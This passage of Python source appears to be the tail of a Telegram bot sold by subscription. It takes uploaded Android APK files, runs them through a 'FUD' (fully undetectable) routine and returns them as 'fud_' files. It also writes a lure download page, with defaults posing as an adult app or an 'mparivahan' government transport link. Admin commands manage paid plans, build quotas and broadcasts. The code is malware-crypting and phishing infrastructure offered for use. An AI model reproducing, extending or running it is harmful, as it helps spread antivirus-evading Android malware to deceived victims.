    can_build, msg = check_subscription(uid)
    if not can_build:
        await update.message.reply_text(f"⛔ {msg}\n\nUpgrade your plan.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 View Plans", callback_data="plans")]]))
        return
    
    doc = update.message.document
    if not doc or not doc.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Send .apk file.")
        return
    
    msg = await update.message.reply_text(f"📦 Receiving {doc.file_name}...")
    file = await context.bot.get_file(doc.file_id)
    path = os.path.join(APK_FOLDER, doc.file_name)
    await file.download_to_drive(path)
    
    await msg.edit_text("🔧 Processing FUD...")
    out = process_fud(path)
    
    sub['builds_used'] = sub.get('builds_used', 0) + 1
    save_subscriptions()
    
    size = round(os.path.getsize(out)/1024/1024, 1)
    app = sub.get('app_name', 'P*rnTube')
    link = sub.get('link_type', 'mparivahan')
    remaining = get_remaining_builds(uid)
    
    html = generate_server_page(link, app, size)
    with open(os.path.join(BUILD_FOLDER, "index.html"), "w") as f:
        f.write(html)
    
    with open(out, 'rb') as f:
        await update.message.reply_document(
            document=InputFile(f, filename=f"fud_{int(time.time())}.apk"),
            caption=f"✅ <b>FUD APK Ready!</b>\n\n📦 Size: {size} MB\n🔗 {link}\n📦 Remaining: {remaining}\n\n💬 @CYBERxTRUSTED",
            parse_mode='HTML'
        )
    await msg.edit_text("✅ FUD Processing Complete!")

# ============================================================
# WEB SERVER FOR HEALTH CHECK (HOSTING)
# ============================================================

def run_web_server(port):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"FUD Bot is running!")
        def log_message(self, format, *args):
            pass
    server = HTTPServer(("0.0.0.0", port), Handler)
    server.serve_forever()

# ============================================================
# MAIN
# ============================================================

def main():
    # Start web server for health checks
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=run_web_server, args=(port,), daemon=True).start()
    print(f"🌐 Web server running on port {port}")
    
    # Start bot
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("assign", assign_plan))
    app.add_handler(CommandHandler("extend", extend_expiry))
    app.add_handler(CommandHandler("block", block_user))
    app.add_handler(CommandHandler("unblock", unblock_user))
    app.add_handler(CommandHandler("search", search_user))
    app.add_handler(CommandHandler("broadcast", broadcast))
    
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    
    print("🤖 FUD Bot started")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    
    app.run_polling()

if __name__ == "__main__":
    main()